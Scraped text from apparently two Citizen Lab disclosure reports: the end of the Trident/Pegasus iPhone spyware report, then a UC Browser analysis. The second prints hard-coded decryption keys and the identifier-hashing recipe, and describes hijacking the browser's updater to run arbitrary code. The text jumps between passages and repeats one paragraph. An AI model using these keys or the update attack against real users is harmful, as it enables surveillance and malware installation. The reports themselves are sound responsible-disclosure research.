enabled macros.  Targets included five dissidents who were later arrested or convicted in absentia, as well as Rori Donaghy, a UK-based journalist who had been publishing articles about leaked emails involving members of the UAE government.\n \n9. Conclusion\nIn this report, we identify a highly technically sophisticated attack involving a zero-day iPhone remote jailbreak — Trident — which installs spyware on a phone whose user clicks just once on a malicious link.  We connected the attack to NSO Group’s Pegasus spyware suite, sold exclusively to government agencies by Israel-based NSO Group.  We made the connection based on our previous work tracing a group of servers that appeared to be part of an infrastructure for attacking mobile phones.  Long before Ahmed Mansoor had forwarded us any suspicious links he received, we had mapped out a set of 237 servers (Section 5), and linked this set to NSO Group (Section 6).  When Mansoor sent us screencaptures of the SMS messages containing the links, we immediately matched the links’ domain name to our list of suspected servers associated with NSO Group’s Pegasus.\nWe visited the links Mansoor sent us from a colleague’s factory-reset stock iPhone, and managed to capture the exploits and payload, as the phone was infected.  We shared these artifacts with Lookout to gain more insight into the technical capabilities of the exploits and spyware, and with Apple as part of a responsible disclosure process.  Apple has been highly responsive, and has worked very quickly to develop and issue a patch in the form of iOS 9.3.5, approximately 10 days after our initial report to them.  Once an iPhone is updated to this most recent version, it will be immediately protected against the Trident exploit chain used in this attack.  While we assume that NSO Group and others will continue to develop replacements for the Trident, we hope that our experience encourages other researchers to promptly and responsibly disclose such vulnerabilities to Apple and to other vendors.\n\nWhat Can You Do?\nAll iPhone owners should update to the latest version of iOS (9.3.5) immediately. If you’re unsure what version you’re running, you can check it yourself by tapping Settings > General > About > Version.\nCitizen Lab agrees with Apple that users should avoid opening or downloading items from messages and websites unless they are certain that they come from a legitimate, trusted source. If you uncertain about the source, you should not click the link or open the file. If you believe you have been the victim of a targeted attack, should consider sharing it with a trusted expert. If you suspect you have been the target of this attack, please contact the Citizen Lab at info@citizenlab.org.\n\nZero-day exploits are expensive and rare, especially one-click remote jailbreak exploits for iPhones, like the Trident.  Such exploits can fetch hundreds of thousands or even a million dollars.  While Citizen Lab research has shown that many state-sponsored spyware campaigns against civil society groups and human rights defenders use “just enough” technical sophistication, coupled with carefully planned deception, the attack on Mansoor demonstrates that not all threats follow this pattern.\nThis is the third time Mansoor has been targeted with “lawful intercept” spyware; Mansoor was targeted in 2011 with spyware from FinFisher (based in Germany and the UK), in 2012 with spyware from Hacking Team (based in Italy), and now in 2016 with what appears to be spyware from NSO Group (based in Israel and reportedly owned by a US firm).  That the companies whose spyware was used to target Mansoor are all owned and operated from democracies speaks volumes about the lack of accountability and effective regulation in the cross-border commercial spyware trade.\nWhile these spyware tools are developed in democracies, they continue to be sold to countries with notorious records of abusive targeting of human rights defenders. Such sales occur despite the existence of applicable export controls.  For example, Israel’s export regime incorporates the dual-use technology controls of the Wassenaar Arrangement, including those related to “intrusion software.” As such, NSO Group would presumably be required to obtain a license to export its products to the UAE.  If NSO Group did submit a license application, the human rights abuses perpetrated by the UAE, including the misuse of “lawful intercept” capabilities, must not have outweighed authorities’ other motivations to approve the export. \nClearly, additional legal and regulatory scrutiny of the the “lawful intercept” market, and of NSO Group’s activities in relation to the attacks we have described, is essential.  Citizen Lab and others have repeatedly demonstrated that advanced “lawful intercept” spyware enables some governments and agencies, especially those operating without strong oversight, to target and harass journalists, activists and human rights workers. If spyware companies are unwilling to recognize the role that their products play in undermining human rights, or address these urgent concerns, they will continue to strengthen the case for further intervention by governments and other stakeholders. \nNote: We are not releasing the malicious files at this time to protect the integrity of ongoing investigations.\n \nAcknowledgements\nSpecial thanks to the team at Lookout that we collaborated with in our investigation, especially: Max Bazaliy, Andrew Blaich, Kristy Edwards, Michael Flossman, Seth Hardy, and Mike Murray.\nVery special thanks to our talented Citizen Lab colleagues, especially: Ron Deibert, Sarah McKune, Claudio Guarnieri, Adam Senft, Irene Poetranto, and Masashi Nishihata. \nSpecial thanks to the teams at Apple Inc. with whom we have been in contact for their prompt and forthright engagement during the disclosure and patching process.\nSpecial thanks to Nicholas Weaver for supplying the iPhone that we infected in Section 4.  Special thanks to Zakir Durumeric.\nSpecial thanks to TNG and others who provided invaluable assistance, including with translation, but requested to remain anonymous.\nThanks to PassiveTotal.\nCitizen Lab’s research into targeted threats against civil society is supported by the John D and Catherine T MacArthur Foundation.  This material is also based upon work supported by the Center for Long Term Cybersecurity (CLTC) at UC Berkeley.\n \nDisclosure Timeline\nCitizen Lab researchers received the initial suspicious link on August 10th 2016, and, shortly thereafter, contacted Lookout Security.  After both teams confirmed the presence of a remote jailbreak we initiated a responsible disclosure process and contacted Apple on August 15th.\nTeams from Citizen Lab and Lookout continued our analysis until the public release of iOS 9.3.5 by Apple, which closes the vulnerabilities that we disclosed.\n\n\t\t\t\t\n\t\t\t",

Please see the “Update: Analysis of updated Android and Windows versions of UC Browser” for our analysis of the changes made to these versions.\n\n\nWe sent the company a letter containing a series of questions about their user data collection practices, and publish their response in full in the Appendix.\n\nIntroduction\nUC Browser is a popular mobile web browser developed by UCWeb, who are owned by the Alibaba Group. The application is widely used in Asia, making it by some metrics the second most used mobile browser in the world after Chrome.\nIn May 2015, we published a report, A Chatty Squirrel: Privacy and Security Issues with UC Browser, which described a number of security concerns we identified with the application. Our research showed that UC Browser transmitted a number of personally identifiable data points, including a user’s IMSI, IMEI, Android ID, geolocation data and search queries, without encryption. The insecure transmission of such data represented a serious privacy risk, since it allowed anyone with access to data traffic to identify users, their devices, and their search history.\nThis risk was not simply a hypothetical. Documents leaked by Edward Snowden showed that members of the Five Eyes intelligence community (Canada, the United States, United Kingdom, Australia and New Zealand) had already identified vulnerabilities in UC Browser and had actively used these vulnerabilities to target and surveil a set of users.\nOur May 2015 report described technical analysis we performed on UC Browser to identify if, and what, personal user data was transmitted insecurely by the application. As described in the report, we identified a number of such vulnerabilities and disclosed them to Alibaba and UCWeb. Although we did not receive any confirmation from Alibaba that the issues identified would be fixed, prior to publication we analyzed the most recently released version of UC Browser (v10.4.1-576) and noted that while some of the security issues we identified were fixed, others remained unresolved.\nThis report seeks to both update our findings by analyzing a more recent version of the application, and to more precisely identify the vulnerabilities in prior versions that were identified in the publicly disclosed Snowden documents. Our analysis finds that all versions of the browser examined, both Windows and Android, transmit personal user data with easily decryptable encryption. In addition, the Windows version of the application does not properly secure its software update process, leaving it vulnerable to arbitrary code execution.\nOur analysis of version 7.9.3.103 of the Android version, released in 2011, shows a number of previously unreported vulnerabilities that are likely the mechanism by which the Five Eyes intelligence community surveilled users.\nWe are publishing this report in coordination with the inaugural release from Net Alert, a collaborative project which seeks to translate new research on privacy and security into clear messages that explain online threats and what users can do about them.\nThis report is a continuation of prior Citizen Lab research on the privacy and security of mobile applications in Asia. We have published a series of reports documenting privacy and security issues in mobile web browsers developed by China’s big three Internet giants: Baidu Browser, Tencent’s QQ Browser, and our prior research on Alibaba’s UC Browser. We have also published a primer on the privacy and security of mobile devices, The Many Identifiers in Our Pockets.\nUC Browser Background\nUC Browser is a highly popular web browser developed by UCWeb, who are owned by the Alibaba Group. Alibaba is one of the largest tech companies in the world and alongside Baidu and Tencent is one of China’s big three technology companies. The company posted total revenue of $12.2 billion USD in 2015, driven primarily by its massive online shopping platforms Taobao and Tmall. Alibaba purchased UCWeb in 2014, in what was at the time the largest ever merger of Chinese tech firms. \nIn December 2015, UC Browser pulled ahead of Safari to become the second most popular mobile browser globally, behind only Chrome, earning 400 million monthly active users. The company has planned to expand the functionality of the application, allowing media outlets to create “content stores” in the browser, as well as to create a mobile advertising platform called Huichuan that would incorporate collected user data from UC Browser and other Alibaba platforms, such as the Shenma search engine and Alibaba-owned location provider AutoNavi. \nUC Browser is available in a number of different versions and for a variety of different operating systems. There are two basic versions of the application: the Chinese-language version and the ‘International’ version, which has support for multiple languages, including English. Varieties of both of these versions are available for Android, Windows, iOS, Blackberry, Windows Mobile and Symbian. The application advertises a number of features beyond those found in default browsers, such as gesture control, ad blocking, and a download manager. \nThe company’s privacy policy discusses the collection of and transmission of personal user data, differentiating between personal data manually provided by users and automatically collected information. Regarding the latter, the privacy policy states that\n “[t]o make UCWeb Services more useful to you, our servers (which may be hosted by a third party service provider) may collect information from you, including but not limited to: the IP address, device information, and location of your device or computer.” \nThe protection of such collected data is also discussed in the privacy policy:\n“We use a variety of industry-standard security technologies and procedures to help protect your Personal Information from unauthorized access, use, or disclosure.”\nCaveats about the limits of data transmission are also mentioned:\n“No method of transmission over the Internet, or method of electronic storage, is 100% secure, however. Therefore, while UCWeb uses reasonable efforts to protect your Personal Information, UCWeb cannot guarantee its absolute security.”\nThese statements are important to consider closely and to compare to how the application actually performs in practice. Reverse engineering and closely scrutinizing how the application handles and communicates data back to servers allows us to make this comparison. We discuss these comparisons in more detail later.\nResponsible Disclosure & Notification\nOn April 13, 2016, we submitted a written description of the issues identified in this report to Alibaba, and indicated that we would be publishing our findings no sooner than 45 days after this date, in line with international standards on vulnerability disclosure. \nOn May 17 and May 24, 2016, Alibaba sent us updated versions of the Android client (Chinese-language and international), which we analyze below in “Update: Analysis of updated Android versions of UC Browser”\nWe have documented all correspondence with Alibaba related to these security issues in an Appendix at the end of this report.\nTechnical analysis\nWe analyzed four different versions of the application for this report, which are summarized in Table 1:\n\n\n\nPlatform\nVersion\nVersion number\nSource\n\n\nWindows\nChinese\n5.5.10106.5\nhttp://www.uc.cn/ucbrowser/download/\n\n\nAndroid\nChinese\n7.9.3.103\nhttp://wap.ucweb.com/verlist/chinese_999/ucbrowser/139\n\n\nAndroid\nChinese\n10.2.1.161\nhttp://www.uc.cn/ucbrowser/download/\n\n\nAndroid\nChinese\n10.9.0.703\nhttp://www.uc.cn/ucbrowser/download/\n\n\n\nTable 1: Summary of versions of UC Browser analyzed in this report\nWe analyzed three different versions of the Chinese-language UC Browser for Android: a version downloaded in January 2016 (10.9.0.703), the version examined in our previous report (10.2.1.161), and a version (7.9.3.103) mentioned in slides leaked by Edward Snowden. Those slides suggested that a user running version 7.9.3.103 of the application had their communications surveilled by Western intelligence agencies as a result of the applications’ leak of personally identifying data. As we had not previously examined this version of the application, we set out to analyze it to identify which vulnerabilities may have been exploited. \nWe analyzed both the Windows and Android versions of UC Browser using reverse engineering techniques. To analyze program behavior, we used machine code and bytecode disassemblers, decompilers, and debuggers including JD, JADX, smalidea, and IDA. To capture and analyze network traffic, we used tcpdump and Wireshark.\nOur technical analysis is divided into three parts. In Part 1 of this report, we analyze the Chinese versions of UC Browser for Windows for security and privacy vulnerabilities. In Part 2, we similarly examine the Chinese version of UC Browser for Android. In Part 3, we set out which of the vulnerabilities we found in the Chinese versions exist in the international versions.\nPart 1: Chinese-language Windows version\nWe analyzed version 5.5.10106.5 of the UC Browser for Windows, which was downloaded from http://www.uc.cn/ucbrowser/download/.\nOur analysis shows three types of security and privacy concerns with this version of UC Browser: the application transmits personally identifying data and the full URL of all pages viewed in the browser with easily decryptable encryption, and has a vulnerable software update process which would allow an attacker to install malicious code.\nLeaks identifying data with easily decryptable encryption\nOur analysis shows that this version of the application transmits personally identifiable user data with easily decryptable encryption to UCWeb servers during its normal operation.\nuc.ucweb.com\nOn startup, we observed UC Browser making an HTTP POST request to uc.ucweb.com.  The body of this request is XML containing an encrypted then base64-encoded payload.  The encryption algorithm used is an extremely simple, symmetric, and easily decryptable encryption algorithm we call UC-XOR where plaintexts are encrypted by XOR masking with the following 8-byte key:\n\"\\xee\\xb9\\xe9\\xb3\\x81\\x8e\\x97\\xa7\"\nThe resulting ciphertext is then appended with two bytes acting as a checksum.  If cksum is the result of XOR’ing each byte of the ciphertext, then the two appended bytes are\n\ncksum XOR’d with the first byte of the 8-byte mask (0xee) and\ncksum XOR’d with the second byte of the 8-byte mask (0xb9).\n\nCode to decrypt this algorithm is available here.  When decrypted, these payloads contain miscellaneous details about the user’s machine.  A sample is below:\n<assign platform=\"winnt\" reassign=\"false\" prd=\"UCBrowser\" sn=\"e2e63e260805aea910e1c2ce02b05211\" \r\nversion=\"5.5.10106.5\" useragent=\"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like \r\nGecko) Chrome/44.0.2403.157 Safari/537.36\" last_server=\"\" lang=\"zh-cn\" btype=\"UC\" pfid=\"101\" \r\nbmode=\"WWW\" />\r\n\r\n\nThese requests contain information about the operating system version and browser version.  Most notable is the sn value, which is a generated value stored in the registry at HKEY_CURRENT_USER\\Software\\UCBrowserPID\\MachineID that acts as a unique identifier to track the user.  To calculate this value, the browser first takes the MD5 hash of the concatenation of\n\nThe string \"CS\"\nCPU model\nThe string \"DS\"\nThe hard drive serial number\nThe string \"MB\"\nThe base board serial number\n\nThen it takes the MD5 hash again of the resulting hash formatted in lowercase ASCII hexadecimal digits, e.g.,\nmd5(md5(\"CSIntel(R) Core(TM) i5-4300U CPU @ 1.90GHzDSVB3bb90c33-fc547c89MB0\")) → \r\n\"e2e63e260805aea910e1c2ce02b05211\"\r\n\r\n\nmmstat.ucweb.com\nWe found frequent, unique HTTP GET requests sent to mmstat.ucweb.com during startup and during operation of the browser.  Each of these requests contains a GET parameter named encrypt_data, which contains an encrypted payload which is then base64-encoded.  It is encrypted according to an algorithm we call UC-M9, as the algorithm is referred to internally as “m9” encoding.  It is a more sophisticated algorithm than the UC-XOR algorithm in the previous section, but it is still non-standard, symmetric, and easily decryptable.  It uses two hard-coded, ASCII-encoded keys \"b59e216a\" and \"8067d108\", or when combined into a single key:\n\n\"b59e216a8067d108\"\nUnlike the previous algorithm which XORs each 8-byte block with the same mask, this algorithm initializes the mask using the first 8 bytes of the key, and for each block the mask is modified as a function of the final 8 bytes of the key.  Code to decrypt this algorithm is available here.\nMost requests to mmstat.ucweb.com do not contain sensitive information.  However, one request we found made during startup contains multiple sensitive data points.  A sample of such a request is below:\n\nbluesky.1.5.1.1.10?cache=3102618000&ka=&kb=e2e63e260805aea910e1c2ce02b05211&kc=\r\n3b5d366db90b1b60e22260a0278331f8v0000002e9952d46&firstpid=0501&bid=800&ver=5.5.10106.5\r\n&defalutbrowser=UCHTML.AssocFile.HTML&flashver=&hi=Intel(R)

requests contain a parameter named kb, which is identical to the sn value described in the previous section, stored in the HKEY_CURRENT_USER\\Software\\UCBrowserPID\\MachineID registry key and generated using the same machine serial numbers.  The kc value is similar to the kb value, except it is stored in HKEY_CURRENT_USER\\Software\\UCBrowserPID\\MachineIDEx and is calculated with an additional MD5 hash and includes the string \"DV\" followed by the machine’s file system volume serial number in the hash.  E.g., using the values of our machine:\n\nLet hash = md5(md5(\"CSIntel(R) Core(TM) i5-4300U CPU @ 1.90GHzDSVB3bb90c33-fc547c89MB0DV280522415-\"))  + \"v0000002\"\nThen return hash + lastEightNibbles(md5(hash))  → \"3b5d366db90b1b60e22260a0278331f8v0000002e9952d46\"\n\nThese mmstat.ucweb.com requests also include, non-hashed, the machine’s hard drive serial number (in this sample, VB3bb90c33-fc547c89), the machine’s base board serial number (0), and the machine’s CPU model (Intel(R) Core(TM) i5-4300U CPU @ 1.90GHz).  It also contains the version of the operating system and of UC Browser, and which browser is installed as the default Windows web browser.\nLeaks pages viewed via mmstat.ucweb.com\nWhile browsing, we observed that some of the HTTP GET requests to mmstat.ucweb.com also contained in their encrypted payloads the full URL of each page viewed.  A sample of such a request is below:\nbluesky.1.25.1.1.7?cache=3766412000&ka=&kb=e2e63e260805aea910e1c2ce02b05211&kc=3b5d366db90b\r\n1b60e22260a0278331f8v0000002e9952d46&firstpid=0501&bid=800&ver=5.5.10106.5&type=1&ssl=1&ban\r\ndwidth=29.63&target_ip=64.106.20.27&redirect_start=0&redirect_duration=0&dns_start=0&dns_du\r\nration=218&connect_start=218&connect_duration=251&request_start=469&request_duration=916&re\r\nsponse_start=1385&response_duration=1&dom_start=1386&dom_duration=268&dom_interactive=234&d\r\nom_content_load_start=1420&dom_content_load_duration=0&load_event_start=1654&load_event_dur\r\nation=26&t0=1385&t1=1719&t2=1719&t3=1420&total_requests=2&requests_via_network=2&cloud_acce\r\nleration_enabled=0&average_of_request_duration=809&average_of_t2_duration=859&private_data=\r\nhost=www.cs.unm.edu|url=https://www.cs.unm.edu/~jeffk/&lang=zh-CN\r\n\r\n\nNote that even though HTTPS normally protects the path of the URL after the host name from being known by eavesdroppers, the full path appears in this easily decryptable request, revealing the individual pages the user browses to anyone eavesdropping on these requests.  These requests also contain performance data on the time it takes to download and render the page, which may be their originally intended purpose.\n\nTable 2 summarizes the personal identifiers transmitted by the application with easily decryptable encryption:\n\n\n\n\nPersonal data point transmitted\nSource\n\n\nHard drive

process\nWhile running, the browser silently checks for updates in the background.  When an updated version is available, the update is downloaded without asymmetric cryptography.  The update metadata itself is protected by an MD5 hash, as is each updated file; however, any active attacker could change both the files and their associated MD5 hashes in order to install malicious code during the update process.\nThe update process uses a complicated system for efficiently sending only the differences in each updated file without having to download the entire updated file.  However, we avoided having to learn this system by using a patch type the update system refers to as Cover, which simply downloads the entire updated file.\nWe used this system to “update” ucagent.exe to an arbitrary executable, a benign program that displays “Oh Hai There”, as shown in Figure 1.  The ucagent.exe executable is run by a UC Browser system service, and so our injected executable runs with full SYSTEM privileges, a Windows user even more privileged than Administrator. Thus, instead of our benign program, an attacker could replace ucagent.exe with malicious code that could be installed and run without the user’s knowledge. The update metadata itself is protected by an MD5 hash, as is each updated file; however, any active attacker could change both the files and their associated MD5 hashes in order to install malicious code during the update process.\n\nThe update process uses a complicated system for efficiently sending only the differences in each updated file without having to download the entire updated file.  However, we avoided having to learn this system by using a patch type the update system refers to as Cover, which simply downloads the entire updated file.\n\nWe used this system to “update” ucagent.exe to an arbitrary executable, a benign program that displays “Oh Hai There”, as shown in Figure 1.  The ucagent.exe executable is run by a UC Browser system service, and so our injected executable runs with full SYSTEM privileges, a Windows user even more privileged than Administrator.

Those leaked documents included a screenshot (see Figure 4 below) of data collected through surveillance on targeted UC Browser users, and that data indicated that one of the compromised Android users was running version 7.9.3.103 of UC Browser. In order to more precisely identify the vulnerabilities noted in these leaked documents, we analyzed version 7.9.3.103 of the application.\nThe results of our analysis of version 10.9.0.703 are described below, and are followed by a comparison to the two older versions of the application. Like the Windows version, our analysis of version 10.9.0.703 of UC Browser for Android found a number of privacy and security concerns. Specifically, the application insecurely transmits personally identifiable user data and all pages viewed in the browser, and has vulnerabilities in the software update process which leave it susceptible to an attacker executing arbitrary code. Table 3 provides a summary of the vulnerabilities and the versions affected by them:\n \n\n\n\nVulnerability \\ Version\n10.9.0.703\n10.2.1.161\n7.9.3.103\n\n\nuc.ucweb.com leak (IMEI, screen dimensions)\nX\nX\nX\n\n\nucus.ucweb.com leak (IMEI, IMSI, screen dimensions)\nX\nX\nX\n\n\napplog.uc.cn leak (IMEI)\nX\nX\n\n\n\nsugs.m.sm.cn leak (address bar contents as typed, IMEI, IMSI, screen dimensions)\nX\nX\n\n\n\nucsec.ucweb.com:8020 leak (full URL of pages viewed)\nX\nX1\n\n\n\napilocate.amap.com leak (IMEI, IMSI, Android ID, cell tower)\n\nX2\n\n\n\nutop.umengcloud.com leak (IMEI, IMSI, Android ID)\nX\nX2\n\n\n\npuds.ucweb.com leak (IMEI, IMSI, CPU type, screen dimensions)\nX\nX\nX\n\n\nProxy leak (URLs and contents of pages visited, IMEI, IMSI)\n\n\nX\n\n\nAttack on update process (arbitrary code execution)\n\n\nX\n\n\n\n1 Only HTTP, not HTTPS, sites\n2 Previously disclosed April 2015 during investigation for a previous report\nTable 3: Vulnerabilities and which Android versions of UC Browser they appear in.\nLeaks sensitive data\nuc.ucweb.com\nLike the Windows version, we also observed the Android version making requests to uc.ucweb.com.  The Android version requests are similar to those made by the Windows version, as they are encrypted using UC-XOR and are just as vulnerable; however, the Android version transmits different data in the requests than the Windows version.  Namely, the Android version transmits the IMEI number of the device, the device’s screen dimensions in pixels, and the version of UC Browser.  In response to this request, the server assigns the browser various parameters including the IP address of a UC proxy server to use for browsing web sites.\nucus.ucweb.com\nWe observed that the Android version makes requests to ucus.ucweb.com upon startup.  (The Windows version also makes similar requests, but we did not observe the Windows versions’ requests to this host to contain any sensitive data.)  These requests are encrypted with the same UC-M9 algorithm as used in the Windows version.  This algorithm uses the following hard-coded, ASCII-encoded key:\n\"e19237a3a933f7eb\"\r\n\nThe code to decrypt these requests is available here.\nWhen decrypted, we found that these requests are protobuf serializations containing the device’s IMEI number, the SIM card’s IMSI number, and the screen dimensions of the device in pixels, as well as various version information.\napplog.uc.cn\nUpon startup, we also observed the browser making requests to applog.uc.cn.  These requests are encrypted with the same UC-M9 algorithm and key as the requests sent to ucus.ucweb.com, but the decrypted message is in plain text instead of being serialized into protobuf.  These requests contain the device’s IMEI number, CPU type, screen dimensions in pixels, and Android OS version.\nsugs.m.sm.cn\nAs a user types into the address bar, the browser sends requests to sugs.m.sm.cn.  These requests are similar in format to the requests sent to ucus.ucweb.com in that they are serialized using protobuf and encrypted with the same UC-M9 algorithm and key.  Moreover, these requests include all of the sensitive data that is also sent to ucus.ucweb.com, and in addition include the contents of the address bar in order to get auto-suggestions.\nutop.umengcloud.com\nWe found that the browser still leaks information originally reported in April 2015 during investigation for a previous report.  These leaks still include the IMEI, IMSI, and Android ID.\n\nLeaks pages viewed via ucsec.ucweb.com:8020\nUpon page view, we observed requests being sent to ucsec.ucweb.com.  These requests are similar in format to the requests sent to ucus.ucweb.com in that they are serialized using protobuf and encrypted with the same UC-M9 algorithm and key.  However, instead of containing hardware serial numbers, they contain the full URL of each page viewed, including those of HTTPS pages.\nProxying\nUnlike the Windows version, the Android version of the browser proxies HTTP requests through UC servers that perform data compression and accelerated browsing.  The browser proxies HTTP requests through a server assigned to the browser in the response to the request to ucus.ucweb.com described earlier.  We found that when the requested URL is unencrypted HTTP, the communication with the proxy is unencrypted; however, when requesting an HTTPS URL, the communication does not go through the proxy.\nUpdate process \nThe browser checks for updates by making an HTTP POST request to puds.ucweb.com.  These requests are similar in format to the requests sent to ucus.ucweb.com in that they are serialized using protobuf and encrypted with the same algorithm and key.  Moreover, they also contain the phone’s IMEI number, the SIM card’s IMSI number, and the screen dimensions of the phone in pixels.  The requests additionally contain Android OS version and CPU type.\nThe server’s responses to the update checks are similar in format and also M9-encrypted except they are encrypted with the following hard-coded, ASCII-encoded key:\n\"aa171021f9438cb2\"\nThese responses do not contain any personal user data, but they do contain the URL for the Android Application Package (APK) that the browser will download to upgrade the application, alongside that APK file’s MD5 hash.  Since this URL and the MD5 hash are encrypted using only symmetric encryption, it is possible to perform a man-in-the-middle attack to cause the browser to download an arbitrary APK file.  However, the version of UC Browser we analyzed verifies the digital signature of the APK downloaded before the system prompts the user to install it, meaning that an attacker can only prompt the user to install an APK signed by UCWeb.  The Android system prevents users from downgrading apps, so this attack could not be used to downgrade UC Browser to an older version, but there may be other UCWeb applications signed with the same key as UC Browser, and an attacker may still be able to trick a user into installing and running a different UCWeb app, even one that contained a vulnerability.  More work is required to investigate this attack.\nComparing with older Android versions\nIn this section, we compare the newest version that we analyzed (10.9.0.703) to older versions of the browser.  In particular, we compare it to version 10.2.1.161, the version analyzed in our previous report on UC Browser and version 7.9.3.103, a version whose vulnerabilities were shown to have been exploited in slides released by Edward Snowden. \nTo obtain version 7.9.3.103 of the APK, we Googled for “7.9.3.103”, the exact version referenced in the slides, and found a page on ucweb.com offering historical versions of the browser for download.  As a precaution, we also checked the digital signature on the APK and verified that it was untampered and signed using the same private key as the other Android versions of the browser that we analyzed.\nOur analysis found that one of the two vulnerabilities described in the previous report is not present in version 10.9.0.703, and we found that three of the newly discovered vulnerabilities described here date back all the way to at least version 7.9.3.103 released in late 2011.  We also found two additional vulnerabilities in 7.9.3.103, a privacy leak in the browser’s proxy implementation and a vulnerability in the browser’s update process.  Both of these vulnerabilities had been fixed before version 10.2.1.161 and 10.9.0.703.  We describe these vulnerabilities in the following two sections. \nProxy information leak in version 7.9.3.103\nUnlike version 10.9.0.703 which only uses the proxy for unencrypted HTTP requests, we found that version 7.9.3.103 of the Android version of UC Browser also sends HTTPS requests through the proxy.  The requests to the proxy are encrypted using UC-XOR, as described earlier.  When decrypted, in version 7.9.3.103, each request includes the full requested URL, even if it is HTTPS, along with the IMEI and IMSI numbers of the device.  In 7.9.3.103, we found the response from the proxy is not encrypted and contains the full URL of the request.  Moreover, by using binwalk, we were able to automatically extract lzma-compressed sections of the response.  We found that these contained the contents of the page, including the full text of the page, thus eliminating the expected encryption of HTTPS.\nVulnerable update process in version 7.9.3.103\nWe also found that version 7.9.3.103 checks for updates in a process similar to the one we describe in version 10.9.0.703.  However, in version 7.9.3.103, the server’s responses are not encrypted at all, and, crucially, the update process does not perform digital signature verification of the downloaded APK file.  This allows an attacker to perform a man-in-the-middle attack to trick a user into installing an arbitrary APK file that may contain malware or spyware (see Figure 2).\n\nFigure 2: Example man-in-the-middle attack on UC Browser’s updater. On the left, we injected a custom update description. On the right, after the update is downloaded, the browser prompts the user to install the Angry Birds APK (an actual attacker might instead craft an app called “UC Browser” with an icon similar to that of UC Browser to further convince the user to install it).\nConnection with leaked intelligence agency slides\nIn this report, we have discovered numerous sensitive data leaks in the latest version of UC Browser.  Both data leaks discovered in the previous report appear to have been introduced into the browser after the version 7.9.3.103 of the browser analyzed by Western intelligence agencies in 2012.  However, we found that many of the vulnerabilities that we outline in this report also exist in version 7.9.3.103, and the contents of the leaks match the description in the intelligence agencies’ slides, as they also describe the leaks as divulging IMEI and IMSI numbers in addition to “device characterics.”  Moreover, the slides reference finding vendor update servers and having the capability of pushing “malware” to victims’ devices.  This is consistent with the man-in-the-middle vulnerability we discovered in the update process of version 7.9.3.103.  Thus, many of the vulnerabilities outlined in this report are strong candidates as the same ones referenced in the leaked intelligence agency slides.\nPart 3: Comparison to International Versions\nOur analysis in this report thus far concerns Chinese versions of UC Browser.  However, UCWeb also produces “international” versions of the browser intended for users outside of China. We examined two of these international versions, one for Windows and one for Android, to determine if the same security and privacy vulnerabilities found on the Chinese versions were also present on the international versions. We looked at the following versions:\n \n\n\n\nPlatform\nVersion\nVersion number\nSource\n\n\nWindows\nInternational\n5.5.9936.1231\nhttp://www.ucweb.com/ucbrowser/download/\n\n\nAndroid\nInternational\n10.9.0.731\nhttp://www.ucweb.com/ucbrowser/download/\n\n\n\nOur analysis showed that this international version of the Windows client contained the same vulnerabilities as those found in the Chinese version (5.5.10106.5).\nOur analysis of the international Android version showed that it shared some, but not all, of the data leaks compared to the Chinese version (10.9.0.703).  Although it has many of the same sensitive information leaks, we did not observe any traffic going to applog.uc.cn, sugs.m.sm.cn, or ucsec.ucweb.com.  Like the Chinese version, we did observe it using a proxy when connecting to HTTP sites but not with HTTPS sites.\nTable 4 summarizes the types of vulnerabilities found in the most recent versions of the application analyzed in this report:\n\n\n\nVulnerability/Version\nWindowsChinese\n(5.5.10106.5)\nWindowsInternational\n(5.5.9936.1231)\nAndroidChinese\n(10.9.0.703)\nAndroidInternational\n(10.9.0.731)\n\n\nLeaks personally identifiable data\nX\nX\nX\nX\n\n\nLeaks pages viewed\nX\nX\nX\n\n\n\nVulnerable software update process\nX\nX\n\n\n\n\n\nTable 4: Summary of vulnerabilities in most recent version of client\nDiscussion\nThe privacy and security issues we identify in this report are concerning for all users of UC Browser. The browser leaks the personal data of users, likely without their knowledge and in a manner which we know leaves it subject to surveillance. However, the issues identified here extend beyond this particular application and beyond this one developer. As our prior research on UC Browser, Baidu Browser and QQ Browser has shown, even within the narrow category of web browsers developed by large Chinese companies, a remarkably similar set of privacy and security issues have emerged.\nIt is important to note that the privacy and security risks identified here are not merely hypothetical. As documents disclosed by Edward Snowden show, western intelligence agencies identified and developed a surveillance plugin exploiting the data leakage in UC Browser --  the second most widely used mobile browser in the world -- no later than 2012, and have in all likelihood been collecting the private data of users since that time. The slide shown in Figure 3 shows the specific data points that intelligence agencies had collected from the application, and our analysis here reveals the vulnerabilities that leak this data.\n\nFigure 3: Slide of Five Eyes intelligence agencies presentation describing UC Browser vulnerability\nThe discovery of this application’s leakage of data allowed the NSA to create a plugin for XKEYSCORE, the spy organization’s massive, comprehensive searchable database of collected Internet traffic. The slide shown in Figure 4 shows a screenshot of this UC Browser XKEYSCORE plugin, illustrating that the IMEI, IMSI, device model and e-mail address of users are actively collected and searchable:\n \n\nFigure 4: Slide showing XKEYSCORE microplugin screenshot, showing leaked data from UC Browser users\nFurther, if Five Eyes intelligence agencies have identified these vulnerabilities as a way to track and target users, it is highly likely that other actors, such as other national intelligence agencies or non-state criminal actors, could have done the same. Although there are no known reports of similar targeting of users of QQ Browser and Baidu Browser, signals intelligence agencies and criminal organizations do not, as a rule, openly disclose their tradecraft; public leaks, such as those coming from the Edward Snowden disclosures, are rare.  We can, however, safely assert that users of UC Browser have been open to potential exploitation by such actors for many years based on the privacy and security vulnerabilities we have identified.\nAs discussed in Part 2, the data leakage exploited by intelligence agencies to collect this data has likely remained unfixed since at least 2012. Although we notified the company in April 2015 of vulnerabilities which leaked data points including a user’s IMSI, IMEI and geolocation data, the issues we identify in this report have remained unaddressed until our April 2016 disclosure. In other words, despite the company’s knowledge that vulnerabilities in UC Browser were actively being exploited by intelligence agencies to target users, they do not appear to have examined beyond the subset of problems we initially disclosed to identify similar vulnerabilities elsewhere in the application. \nThis case illustrates the ‘whack-a-mole’ nature of identifying and fixing these kinds of vulnerabilities. Applications like UC Browser are continually updated with new features and services, across numerous different platforms and localized versions. Unless developers make the privacy and security of user data a more fundamental part of their development process, security researchers will continue to play ‘catch-up’ in efforts to find these problems and report them.\nUC Browser’s security concerns are not limited to the insecure transmission of personal user data. The vulnerabilities found in the browser’s update process would allow an attacker with a privileged network position to install malicious software onto the device, potentially with minimal warning to the user. Like the leak of sensitive data, we know from slides disclosed by Edward Snowden that this vulnerability was known and likely exploited by intelligence agencies, as shown in Figure 5:\n\nFigure 5: Slide describing the installation of malware onto the devices of UC Browser users\nOne of the causes of the software update vulnerability described in our report is China’s own system of Internet censorship.  Specifically, the blocking of the Google Play Store in China forces developers to create home-grown methods 